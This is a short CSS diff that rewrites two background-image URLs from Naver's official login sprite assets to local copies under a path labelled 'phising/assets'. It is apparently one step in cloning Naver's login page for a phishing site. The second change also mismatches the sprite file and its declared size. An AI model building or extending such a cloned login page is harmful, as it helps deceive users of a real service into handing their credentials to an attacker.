@@ -107,7 +107,7 @@ table {
 .footer .footer_copy .footer_logo,
 .header .logo,
 .reconfirm_top .logo {
-    background-image: url(https://ssl.pstatic.net/static/nid/login/m_sp_00_common_978240a6.png);
+    background-image: url(localhost/phising/assets/m_sp_00_common_978240a6.png);
     background-size: 244px 107px;
     background-repeat: no-repeat
 }
@@ -182,7 +182,7 @@ table {
 body.oauth_mobile .header_oauth .btn_profile::after,
 body.oauth_mobile .header_oauth .logo .link::before,
 body.oauth_mobile .oauth_wrap .age_area::before {
-    background-image: url(https://ssl.pstatic.net/static/nid/login/m_sp_01_login_7b3d4fc3.png);
+    background-image: url(localhost/phising/assets/m_sp_00_common_978240a6.png);
     background-size: 336px 330px;
     background-repeat: no-repeat
 }
